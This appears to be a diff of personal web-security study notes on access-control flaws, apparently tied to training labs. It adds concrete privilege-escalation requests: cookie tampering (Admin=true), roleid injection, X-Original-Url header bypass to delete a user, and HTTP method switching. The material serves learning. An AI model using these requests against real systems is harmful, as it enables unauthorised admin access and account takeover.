@@ -795,12 +795,12 @@
 
 ## Access Control
 **Types of control**
-- vertical access control: admin (privilege account type)
-- horizontal access control: access other user's resource
-- context-dependent access control (referer, location)
+- **vertical** access control: admin (privilege account type)
+- **horizontal** access control: access other user's resource
+- **context-dependent** access control (referer, location)
 - hidden fields to determine the user's access rights or role at login     
   - `<input type="hidden" name="role" value="admin">`
-  - URL param https://insecure-website.com/login/home.jsp?`role=1`
+  - URL param https://insecure-website.com/login/home.jsp?**role=1**
   
 **Mitigation**
 - Never rely on obfuscation alone for access control
@@ -817,19 +817,51 @@
 - Unprotected admin functionality
   - browse /**robots.txt**
   - Disallow: /**administrator-panel**
-- Unprotected admin functionality with unpredictable URL
+- Unprotected admin functionality with **unpredictable URL**
   - Target Site Map > Right click Engagement Tools > **Find script**
     adminPanelTag.setAttribute('href', '/admin-8trs8m');
-- User role controlled by request parameter
-- User role can be modified in user profile
+- User role controlled by **request parameter**
+  - GET /my-account?id=wiener
+    **Cookie: Admin=false**; session=LBIW6sGesUS0nfCXovL7GFhhmW8tobYb
+  - Change the cookie value > **Admin=true**
+- User ID controlled by **request parameter**
+  - change the id to another user (horizontal privilege escalation)   
+  - GET /my-account?`id=carlos`
+- **User rol**e can be **modified** in user profile
+  - POST /my-account/change-email
+    Body {"email":"edisonchen2019@gmail.com"}
+  - Response
+    ```   
+    {
+     "username": "wiener",
+     "email": "edisonchen2019@gmail.com",
+     "apikey": "ppquj0gz6sLCcuFt7ATXkID0dnsuJP4u",
+     "roleid": 1
+    }
+    ```  
+  - Append roleid to uppdate   
+    Body {"email":"edisonchen2019@gmail.com", **"roleid": 2**}   
+- **URL-based access control** can be circumvented
+  - GET /admin > access denied
+  - GET /  > response 200
+    X-Original-Url: /admin
+  - Delete the user `<a href="/admin/delete?username=carlos">`   
+    GET `/?username=carlos`   
+    `X-Original-Url: /admin/delete`   
+- Method-based access control can be circumvented
+  - **Admin upgrade user**
+    POST /admin-roles   
+    username=carlos&action=upgrade   
+  - Another window **login as normal user (wiener)**
+    Right click repeater of POST /admin-roles > **Change request method**
+    change the session to own cookies
+    **GET** /admin-roles?**username=wiener**&action=upgrade
 - User ID controlled by request parameter
-- User ID controlled by request parameter, with unpredictable user IDs
+- User ID controlled by request parameter, with unpredictable user IDs   
 - User ID controlled by request parameter with data leakage in redirect
 - User ID controlled by request parameter with password disclosure
 - Insecure direct object references
-- URL-based access control can be circumvented
-- Method-based access control can be circumvented
-- Multi-step process with no access control on one step
+- Multi-step process with no access control on one step   
 - Referer-based access control   
 
 ## File Upload
